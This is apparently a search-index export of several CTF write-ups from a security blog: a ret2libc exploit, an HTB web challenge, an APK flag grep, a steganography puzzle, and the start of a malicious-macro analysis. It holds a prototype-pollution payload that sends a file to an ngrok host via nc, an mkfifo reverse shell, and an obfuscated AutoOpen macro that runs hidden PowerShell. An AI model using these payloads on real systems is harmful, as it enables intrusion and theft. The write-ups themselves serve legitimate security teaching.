p32(bin_sh_addr) p.sendlineafter(b'Name? ', payload) p.recvline() p.recvline() p.interactive()  And if everything is correct, we must have a shell:\n$ python3 solve.py [+] Guessed number: -3423 [+] Starting local process './vuln': pid 159500 [+] Leaked canary: 0x7baaa300 [+] Leaked puts() address: 0xf7d8b290 [+] Glibc base address: 0xf7d1a000 [*] Switching to interactive mode $ ls Makefile solve.py vuln vuln.c  Remote exploit Now it is time to obtain the version of Glibc for the remote instance.\nThe first thing we notice is that the number -3423 is not correct for the remote instance. Thus, we must perform a brute force attack since we cannot leak it:\nnumber = 0 number_progress = log.progress('Guessed number') for i in range(-4096, 4095): number_progress.status(str(i)) with context.local(log_level='CRITICAL'): p = get_process() p.sendlineafter(b'What number would you like to guess?\\n', str(i).encode()) if b'Congrats!' in p.recvline(): number = i number_progress.success(str(number)) break p.close()  $ python3 solve.py jupiter.challenges.picoctf.org 15815 [|] Guessing number: -3983 [+] Guessed number: -3983  Nice, it is -3983 for the remote instance. Now let\u0026rsquo;s run our current exploit:\n$ python3 solve.py jupiter.challenges.picoctf.org 15815 [+] Guessed number: -3983 [+] Opening connection to jupiter.challenges.picoctf.org on port 15815: Done [+] Leaked canary: 0xf2d4c600 [+] Leaked puts() address: 0xf7e10460 [+] Glibc base address: 0xf7d9f1d0 [*] Switching to interactive mode timeout: the monitored command dumped core [*] Got EOF while reading in interactive $  Obviously, it is not going to work because the Glibc version is not the same we have locally. However, we can use an online Glibc database where we search for the last three hexadecimal digits of puts address (namely, 460):\nWe see that the offset of puts is 0x071460, the offset of system is 0x045350 and the offset for \u0026quot;/bin/sh\u0026quot; is 0x19032b. If we update these values in the exploit, we still don\u0026rsquo;t get a shell. We can try more versions of Glibc until we get to the right one:\n puts offset: 0x067460 system offset: 0x03ce10 \u0026quot;/bin/sh\u0026quot; offset: 0x17b88f  Flag And finally, the exploit works remotely:\n$ python3 solve.py jupiter.challenges.picoctf.org 15815 [+] Guessed number: -3983 [+] Opening connection to jupiter.challenges.picoctf.org on port 15815: Done [+] Leaked canary: 0x70b20e00 [+] Leaked puts() address: 0xf7dc9460 [+] Glibc base address: 0xf7d62000 [*] Switching to interactive mode $ ls flag.txt vuln vuln.c xinet_startup.sh $ cat flag.txt picoCTF{p0p_r0p_4nd_dr0p_1t_506b81e98597929e}  The full exploit can be found in here: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/guessing-game-2/","section":"ctf","summary":"picoCTF 2020 Mini-Competition. 300 points. 32-bit binary. Buffer Overflow and Format String. Ret2Libc. Bypass ASLR and canary","time":11,"title":"Guessing Game 2"},{"contents":"We have a website with a nice style:\nThere is only one user input:\nThis is a Node.js application that uses pug as a template renderer (as shown in the available files from the challenge).\nIt also uses flat to parse JSON data, as shown in the following file called routes/index.js:\nconst path = require('path') const express = require('express') const pug = require('pug') const { unflatten } = require('flat') const router = express.Router() router.get('/', (req, res) =\u0026gt; { return res.sendFile(path.resolve('views/index.html')) }) router.post('/api/submit', (req, res) =\u0026gt; { const { artist } = unflatten(req.body) if ( artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell') ) { return res.json({ response: pug.compile( 'span Hello #{user}, thank you for letting us know!' )({ user: 'guest' }) }) } return res.json({ response: 'Please provide us with the full name of an existing member.' }) }) module.exports = router  There is a well-known vulnerability of unflatten from the flat module. It is a Prototype Pollution vulnerability, which basically allows to define global variables.\nThis vulnerability combined with a template renderer such as pug (or handlebars) can lead to Remote Code Execution (RCE) because of a debugging feature. All of this is clearly explained in https://blog.p6.is/AST-Injection/#Pug.\nWe can test that Prototype Pollution works just by running the challenge in a Docker container and putting a simple console.log(x) after the unflatten statement.\nNow, if we provide the following JSON payload the console.log(x) will result in a true message in the server log (now x is a global variable):\n{ \"__proto__.x\": true }  Then we can test some payloads with pug, according to the blogpost mentioned before. With the following payload, we can put some text after a template block (for example #{user} on the JavaScript file shown above):\n{ \"artist.name\": \"Haigh\", \"__proto__.block\": { \"type\": \"Text\", \"val\": \"RandomText\" } }  $ curl 157.245.43.98:31191/api/submit -H 'Content-Type: application/json' -d '{\"artist.name\":\"Haigh\",\"__proto__.block\":{\"type\":\"Text\",\"val\":\"RandomText\"}}' {\"response\":\"\u0026lt;span\u0026gt;Hello guestRandomText, thank you for letting us know!\u0026lt;/span\u0026gt;\"}  We see that guest is followed by RandomText so we are able to use Prototype Pollution to perform AST Injection and modify the behavior of pug.\nNotice that we used Haigh as artist.name because we need that artist.name.includes('Haigh') returns true to make pug render the message.\nThere is a way to gain RCE by using line instead of val. However, it will not be printed in the response from the server. The straight-forward thing to get the flag is trying to use a reverse TCP shell. However, this is a little overkill because we only need the flag (although the filename is randomized, we can use wildcards).\nAs this is a public instance, we need to have a public IP address to receive the connection. That is where ngrok comes into place.\nWe can simply start a nc listener in port 4444, for example. And then start ngrok:\n$ ngrok tcp 4444 ngrok Session Status online Account Rocky (Plan: Free) Version 2.3.40 Region United States (us) Latency 120.893ms Web Interface http://127.0.0.1:4040 Forwarding tcp://0.tcp.ngrok.io:14109 - localhost:4444 Connections ttl opn rt1 rt5 p50 p90 1 0 0.00 0.00 0.00 0.00  As a result, we have created a tunnel from our private socket to the public one hosted by ngrok.\nThis will be the payload to retrieve the flag (using a wildcard):\n{ \"artist.name\": \"Haigh\", \"__proto__.block\": { \"type\": \"Text\", \"line\": \"process.mainModule.require(\\\"child_process\\\").execSync(\\\"cat /app/flag* | nc 0.tcp.ngrok.io 14109\\\")\" } }  $ curl 157.245.43.98:31191/api/submit -H 'Content-Type: application/json' -d '{\"artist.name\":\"Haigh\",\"__proto__.block\":{\"type\":\"Text\",\"line\":\"process.mainModule.require(\\\"child_process\\\").execSync(\\\"cat /app/flag* | nc 0.tcp.ngrok.io 14109\\\")\"}}' {\"response\":\"\u0026lt;span\u0026gt;Hello guestRandomText, thank you for letting us know!\u0026lt;/span\u0026gt;\"}  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from ::1. Ncat: Connection from ::1:59447. HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}  It is also possible to get a reverse shell. The payload is this one:\n{ \"artist.name\": \"Haigh\", \"__proto__.block\": { \"type\": \"Text\", \"line\": \"process.mainModule.require(\\\"child_process\\\").execSync(\\\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 0.tcp.ngrok.io 14109 \u0026gt;/tmp/f\\\")\" } }  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from ::1. Ncat: Connection from ::1:59469. /bin/sh: can't access tty; job control turned off /app $ whoami nobody /app $ ls flagYFOSp index.js node_modules package.json routes static views yarn.lock /app $ cat flagYFOSp HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}  ","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/web/gunship/","section":"ctf","summary":"Prototype Pollution. AST Injection","time":4,"title":"Gunship"},{"contents":"We have an Android APK file called thermostat.apk:\n$ file thermostat.apk thermostat.apk: Zip archive data, at least v0.0 to extract, compression method=deflate  As it is shown an APK file is just a ZIP archive. Therefore, we can extract its contents:\n$ 7z x thermostat.apk Scanning the drive for archives: 1 file, 2595443 bytes (2535 KiB) Extracting archive: thermostat.apk -- Path = thermostat.apk Type = zip Physical Size = 2595443 Everything is Ok Files: 569 Size: 4968479 Compressed: 2595443 $ ls AndroidManifest.xml META-INF classes.dex res resources.arsc thermostat.apk  This challenge is so easy that the flags are inside the extracted files. We can use grep recursively, no need to use apktool or decompilers to Java code:\n$ grep -r FLAG * Binary file classes.dex matches  We see that there are matches inside classes.dex. Since it is a binary file, we can view printable data using strings. After that, we can extract both flags using grep again, with a more specific filter (using the actual format of Hacker101CTF flags):\n$ strings classes.dex | grep -oE '\\^FLAG\\^.*?\\$FLAG\\$' ^FLAG^xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$FLAG$ ^FLAG^xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$FLAG$  ","image":"/images/mobile.png","permalink":"https://7rocky.github.io/en/ctf/hacker101ctf/h1-thermostat/","section":"ctf","summary":"Basic mobile APK pentesting","time":1,"title":"H1 Thermostat"},{"contents":"We are given a JPEG image called hackerman.jpg:\n$ file hackerman.jpg hackerman.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 960x540, components 3  Since it is a JPEG image, we can think of steganography using steghide. But it does not seem to work for the moment.\nIf we check the printable strings that are inside the image file, we will see a string that seems to be an MD5 hash (32 hexadecimal digits):\n$ strings -20 hackerman.jpg | xxd 00000000: 0c0c 0c0c 0c0c 0c0c 0c0c 0c0c 0c0c 0c0c ................ 00000010: 0c0c 0c0c 0c0c 0c0c 0c0c 0c0c 0a0c 0c0c ................ 00000020: 0c0c 0c0c 0c0c 0c0c 0c0c 0c0c 0c0c 0c0c ................ 00000030: 0c0c 0c0c 0c0c 0c0c 0c0a 2526 2728 292a ..........%\u0026'()* 00000040: 3435 3637 3839 3a43 4445 4647 4849 4a53 456789:CDEFGHIJS 00000050: 5455 5657 5859 5a63 6465 6667 6869 6a73 TUVWXYZcdefghijs 00000060: 7475 7677 7879 7a0a 2627 2829 2a35 3637 tuvwxyz.\u0026'()*567 00000070: 3839 3a43 4445 4647 4849 4a53 5455 5657 89:CDEFGHIJSTUVW 00000080: 5859 5a63 6465 6667 6869 6a73 7475 7677 XYZcdefghijstuvw 00000090: 7879 7a0a 3536 3334 3237 3564 3639 3466 xyz.5634275d694f 000000a0: 3836 3635 3935 3737 3436 6339 3631 3931 8665957746c96191 000000b0: 3332 6630 0a 32f0. $ strings -20 hackerman.jpg | grep -v \\\\x0c %\u0026'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz \u0026'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz 5634275d694f8665957746c9619132f0 $ echo -n 5634275d694f8665957746c9619132f0 | wc -c 32  If we put this hash in crackstation.net we will find that almost is the word whose MD5 hash is the one above.\nSo we got can try almost as password for steghide:\nAnd we get a string that seems to be encoded in Base64. And there\u0026rsquo;s the flag:\n$ echo SFRCezN2MWxfYzBycH0= | base64 -d HTB{3v1l_c0rp}  ","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/misc/hackerman/","section":"ctf","summary":"Crack MD5 hash. Steganography with steghide","time":2,"title":"Hackerman"},{"contents":"We are given a ZIP archive that contains a file named invitation.docm:\n$ unzip -l forensics_halloween_invitation.zip Archive: forensics_halloween_invitation.zip Length Date Time Name --------- ---------- ----- ---- 5252634 10-12-2022 08:04 invitation.docm --------- ------- 5252634 1 file $ unzip forensics_halloween_invitation.zip Archive: forensics_halloween_invitation.zip inflating: invitation.docm $ file invitation.docm invitation.docm: Microsoft Word 2007+  VBA macros extraction This means that we have a Microsoft Word document with VBA macros. Instead of opening Microsoft Word, we can use olevba from oletools to extract the VBA code:\n$ olevba invitation.docm olevba 0.60.1 on Python 3.10.8 - http://decalage.info/python/oletools =============================================================================== FILE: invitation.docm Type: OpenXML WARNING For now, VBA stomping cannot be detected for files in memory ------------------------------------------------------------------------------- VBA MACRO ThisDocument.cls in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument' - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - Sub AutoOpen() odhsjwpphlxnb Call lmavedb End Sub Private Sub odhsjwpphlxnb() Dim bnhupraoau As String CreateObject(\"WScript.Shell\").currentdirectory = Environ(\"TEMP\") bnhupraoau = sryivxjsdncj() dropPath = Environ(\"TEMP\") Set rxnnvnfqufrzqfhnff = CreateObject(uxdufnkjlialsyp(\"53637269707469\") \u0026 uxdufnkjlialsyp(\"6e672e46696c6553797374656d4f626a656374\")) Set dfdjqgaqhvxxi = rxnnvnfqufrzqfhnff.CreateTextFile(dropPath \u0026 uxdufnkjlialsyp(\"5c68697374\") \u0026 uxdufnkjlialsyp(\"6f72792e62616b\"), True) dfdjqgaqhvxxi.Write bnhupraoau dfdjqgaqhvxxi.Close End Sub Private Function wdysllqkgsbzs(strBytes) As String Dim aNumbers Dim fxnrfzsdxmcvranp As String Dim iIter fxnrfzsdxmcvranp = \"\" aNumbers = Split(strBytes) For iIter = LBound(aNumbers) To UBound(aNumbers) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + Chr(aNumbers(iIter)) Next wdysllqkgsbzs = fxnrfzsdxmcvranp End Function Private Function okbzichkqtto() As String Dim fxnrfzsdxmcvranp As String fxnrfzsdxmcvranp = \"\" fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"3734203635203636203132322036352036382034382036352037342031\") \u0026 uxdufnkjlialsyp(\"31392036352035312036352036382039392036352037362031303320363520353120363520363820383120363520373620313033\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"363520313230203635203638203130\") \u0026 uxdufnkjlialsyp(\"37203635203739203635203635203131372036352036382038352036352037372031303320363520353420363520363820313033203635203737203635203635203532\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"3635203638203635203635203734\") \u0026 uxdufnkjlialsyp(\"20313139203635203535203635203637203831203635203937203831203635203537203635203637203939203635203930203635203635203438203635203638203737\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"3635203839203130332036362031303620363520373120373720363520373820313033203636203130372036352036\") \u0026 uxdufnkjlialsyp(\"37203438203635203737203635203635203438203635203638203737203635203930\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"313033203635203132312036352036382038312036352037372036352036352035\") \u0026 uxdufnkjlialsyp(\"33203635203637203438203635203738203131392036362031303820363520373120363920363520373720313033203635\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"313232203635203731203639203635203737203130332036362031303620363520363720393920363520373920313139203635203130372036352037322036352036352038302038312036352031\") \u0026 uxdufnkjlialsyp(\"3130203635\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"373120313033203635203130302036352036362034382036352037322036352036352037392031303320\") \u0026 uxdufnkjlialsyp(\"36352031313820363520363720353620363520373420313139203635203535203635203637203831\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"36352031303020313033203635203537203635203639203130372036352039382031303320363620353020363520373120353620363520393720313139203636203130382036352036372034\") \u0026 uxdufnkjlialsyp(\"38203635203835\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"31303320363620313038203635203732203737203635203130302036352036362037382036352037312038352036352031303020363520363620313131203635203731203536203635203930\") \u0026 uxdufnkjlialsyp(\"203635203635\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"313033203635203637203438203635203836203831203636203132322036352037312038\") \u0026 uxdufnkjlialsyp(\"35203635203831203130332036362031303420363520373220373720363520393720383120363620313036203635\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"373020363520363520383920383120363620313231203635203732203737203635203937203831203636\") \u0026 uxdufnkjlialsyp(\"2031313720363520373120393920363520373320363520363520313136203635203730203835203635\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"3939203130332036362031313220363520363720363520363520373420363520363620313139203635203637203831203635203939203131392036352031313820\") \u0026 uxdufnkjlialsyp(\"3635203731203831203635203738203635\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"363520313232203635203731203733203635\") \u0026 uxdufnkjlialsyp(\"20383920313139203636203130362036352036382038392036352039302036352036352031303320363520363720343820363520383320363520363620313038\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"36352037312036392036352039302036352036362031303820363520373220373320363520393920313139203635\") \u0026 uxdufnkjlialsyp(\"20313033203635203639203635203635203130312031313920363520313035203635203639\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"363920363520313030203831203636203438203635203731203130332036352039\") \u0026 uxdufnkjlialsyp(\"38203131392036362031323120363520373120313037203635203130312031303320363620313034203635203732203831\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"363520393720383120363620\") \u0026 uxdufnkjlialsyp(\"313138203635203731203532203635203733203130332036352035372036352036372038312036352039372038312036362035372036352036382031313520363520313030\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"313139203636203131312036352037312031303720363520393820363520363620313038\") \u0026 uxdufnkjlialsyp(\"2036352036372036352036352037352036352036352031303720363520373220383120363520393920313033203636\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"34392036352037312038352036352037352038312036362035352036352036372038312036352038392031313920363520353720363520363720313033203635203833203831203636203131\") \u0026 uxdufnkjlialsyp(\"37203635203732\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"38392036352039382031313920363620313134203635203731203835203635203736203831203636203833\") \u0026 uxdufnkjlialsyp(\"20363520373120383520363520393920313139203636203438203635203639203438203635203930\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"38312036362034382036352037312031303320363520393820313139203636203130372036352036372036352036352037362038312036362038362036352037322037\") \u0026 uxdufnkjlialsyp(\"37203635203930203831203636203637\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"363520373120363920363520393920313139203636203131322036352037312037372036352038352036352036362031303420363520\") \u0026 uxdufnkjlialsyp(\"37322037332036352039392031313920363620313132203635203731\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"35322036352039302031313920363520313033203635203637203438203635203836203831203636203132312036352037312031303720363520373320363520363520313037203635203732203635\") \u0026 uxdufnkjlialsyp(\"203635\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"37342036352036362031323220363520363720\") \u0026 uxdufnkjlialsyp(\"35362036352037372036352036352034382036352036382037372036352039302031303320363520313231203635203638203831203635203737203635203635\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"353320363520363720363520363520373620383120363620373320363520373120383520363520383920383120363620313037203635\") \u0026 uxdufnkjlialsyp(\"2037312038352036352039392031303320363620313232203635203637\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"36352036352038312036352036362035352036352036372037332036352038\") \u0026 uxdufnkjlialsyp(\"3120383120363620343920363520373220383120363520393720363520363620313138203635203732203733203635203937\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"383120363620353420363520373120363920363520\") \u0026 uxdufnkjlialsyp(\"313030203635203636203131322036352037312035362036352039382031303320363520313035203635203638203438203635203734203635203636\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"31313220363520373220343820363520\") \u0026 uxdufnkjlialsyp(\"37352038312036352035352036352037312031303720363520393020313033203635203130332036352036372031303320363520373420363520363620313036203635\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"3637\") \u0026 uxdufnkjlialsyp(\"20363520363520373620383120363620313137203635203731203835203635203733203635203635203131302036352036392035322036352039382031313920363620313137203635203731203835\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"363520373420313139203635203131322036352036372036352036352031303120313139203635203130372036352037322037332036352038302038312036362031313220363520\") \u0026 uxdufnkjlialsyp(\"373120383520363520313031\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"36352036352031303320\") \u0026 uxdufnkjlialsyp(\"363520363720383120363520383920313139203635203130332036352036372034382036352038322038312036362031323120363520373220373320363520393820313139203636\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"3132312036352036392036392036352038392031313920363620343820363520373120313037203635203938203131392036362031313720363520\") \u0026 uxdufnkjlialsyp(\"363720363520363520383520313139203636203438203635\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"3731203536203635203939203635203635203130332036352036372034382036352038322038312036362031323120\") \u0026 uxdufnkjlialsyp(\"36352037322037332036352039382031313920363620313231203635203730203839\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"363520383920383120363620313231203635203731203130372036352038392038\") \u0026 uxdufnkjlialsyp(\"31203636203130352036352037312031313920363520393020383120363520313033203635203731203835203635203739\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"3131392036352031303720363520373220373320363520383020383120\") \u0026 uxdufnkjlialsyp(\"3636203830203635203732203835203635203130302036352036352031313620363520373020373720363520313030203635203636\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"3132312036352037\") \u0026 uxdufnkjlialsyp(\"31203130372036352039382031303320363620313130203635203637203635203635203736203831203636203734203635203731203532203635203939203635203636203439203635\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"37322038312036352038342031313920363620313035203635203731203131312036352039302038312036362031303620363520373220383120363520373320363520363520313037203635203732\") \u0026 uxdufnkjlialsyp(\"203733\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"3635203739203131392036352031303720363520373220383120363520383020383120363620\") \u0026 uxdufnkjlialsyp(\"373420363520373120353220363520313030203130332036362031313820363520373120313135203635203930\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"38312036352031313620363520373020373320363520393020383120363620313232203635203732203831203635203834203831203636203130\") \u0026 uxdufnkjlialsyp(\"3820363520373220383120363520393720363520363620313138\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"3635203731203831203635203733\") \u0026 uxdufnkjlialsyp(\"20363520363520313136203635203730203835203635203939203130332036362031313220363520363720363520363520373420363520363620313139203635203637\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"3831203635203939203131392036352031313820363520363820393920363520393020383120363620313034203635203638203733203635203737203131392036362031303420363520363820373320\") \u0026 uxdufnkjlialsyp(\"3635\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"38392031313920363520313033203635203637203438203635203834203831203636203130382036352037322038312036352039372036352036362031313820363520373120\") \u0026 uxdufnkjlialsyp(\"3831203635203733203635\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"363620383120\") \u0026 uxdufnkjlialsyp(\"36352036392035362036352038352031313920363620383520363520363720363520363520373620383120363620373320363520373120383520363520383920383120363620313037203635\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"37312038352036352039392031303320363620313232203635203637203635203635203831203635203636203535\") \u0026 uxdufnkjlialsyp(\"203635203637203733203635203831203831203636203439203635203732203831203635\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"3937203635203636203131382036352037322037332036352039372038312036362035342036352037312036392036352031303020363520363620313132203635203731203536203635203938\") \u0026 uxdufnkjlialsyp(\"20313033\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"3635203130352036352036382034382036352037342036352036362031313220363520373220343820363520373320363520363520\") \u0026 uxdufnkjlialsyp(\"3131362036352036392037332036352039382031313920363620313037\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"363520373220\") \u0026 uxdufnkjlialsyp(\"3130372036352037332036352036352031313120363520373020313135203635203835203131392036362035332036352037322037372036352031303020363520363620313038203635203731\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"3438203635\") \u0026 uxdufnkjlialsyp(\"203736203130332036362038352036352037312038352036352031303120363520363620343820363520363720353220363520383220383120363620313137203635203731203737203635203938\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"3131392036362031303720363520373120313037203635203938203130332036362031313020363520373020343820363520373920313033203635203534203635203730203835203635\") \u0026 uxdufnkjlialsyp(\"203836203635203636\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"37312036352036382031303320363520373620313033203636203732203635203731\") \u0026 uxdufnkjlialsyp(\"20383520363520313030203635203636203637203635203732203130372036352031303020363520363620313038203635\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"3732203737203635203735203635203635203130372036352037312038352036352037352031313920363520313037203635203732203733203635203735203831203635\") \u0026 uxdufnkjlialsyp(\"20313033203635203637203438\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"36352039372031303320363620\") \u0026 uxdufnkjlialsyp(\"3131382036352037312031303720363520393820313033203635203130332036352036372039392036352037332036352036352031313020363520363720313037203635\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"313032\") \u0026 uxdufnkjlialsyp(\"20383120363520313033203635203732203737203635203938203635203636203130382036352037312038352036352039392036352036352031303320363520363820363520363520373620313033\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"363520353220363520373220343820363520383320363520363620\") \u0026 uxdufnkjlialsyp(\"3835203635203639203733203635203130312031313920363520343920363520373220383520363520393920363520363520313232203635\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"373220373320363520383820313139203635203132322036352036382038312036352037382038\") \u0026 uxdufnkjlialsyp(\"31203636203533203635203730203536203635203938203831203635203438203635203731203737203635\")) fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs(uxdufnkjlialsyp(\"393920313033203635203131392036352036382038352036352031303220383120\") \u0026 uxdufnkjlialsyp(\"3635203631\")) okbzichkqtto = fxnrfzsdxmcvranp End Function Private Function sryivxjsdncj() As String Dim fxnrfzsdxmcvranp As String fxnrfzsdxmcvranp = \"\" fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + okbzichkqtto() sryivxjsdncj = fxnrfzsdxmcvranp End Function Sub lmavedb() dropPath = Environ(\"TEMP\") Set rxnnvnfqufrzqfhnff = CreateObject(uxdufnkjlialsyp(\"536372697074696e672e46696c6553797374\") \u0026 uxdufnkjlialsyp(\"656d4f626a656374\")) Set ktmlmpc = rxnnvnfqufrzqfhnff.OpenTextFile(dropPath \u0026 uxdufnkjlialsyp(\"5c68\") \u0026 uxdufnkjlialsyp(\"6973746f72792e62616b\")) secret = ktmlmpc.ReadAll ktmlmpc.Close Code = \"powershell -WindowStyle hidden -e \"\"\" \u0026 secret x = Shell(Code, 1) End Sub ------------------------------------------------------------------------------- VBA MACRO Module1.bas in file: word/vbaProject.bin - OLE stream: 'VBA/Module1' - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - Function uxdufnkjlialsyp(ByVal tiyrahvbz As String) As String Dim nqjveawetp As Long For nqjveawetp = 1 To Len(tiyrahvbz) Step 2 uxdufnkjlialsyp = uxdufnkjlialsyp \u0026 Chr$(Val(\"\u0026H\" \u0026 Mid$(tiyrahvbz, nqjveawetp, 2))) Next nqjveawetp End Function +----------+--------------------+---------------------------------------------+ |Type |Keyword |Description | +----------+--------------------+---------------------------------------------+ |AutoExec |AutoOpen |Runs when the Word document is opened | |Suspicious|Environ |May read system environment variables | |Suspicious|Write |May write to a file (if combined with Open) | |Suspicious|CreateTextFile |May create a text file | |Suspicious|Shell |May run an executable file or a system | | | |command | |Suspicious|WScript.Shell |May run an executable file or a system | | | |command | |Suspicious|powershell |May run PowerShell commands | |Suspicious|Call |May call a DLL using Excel 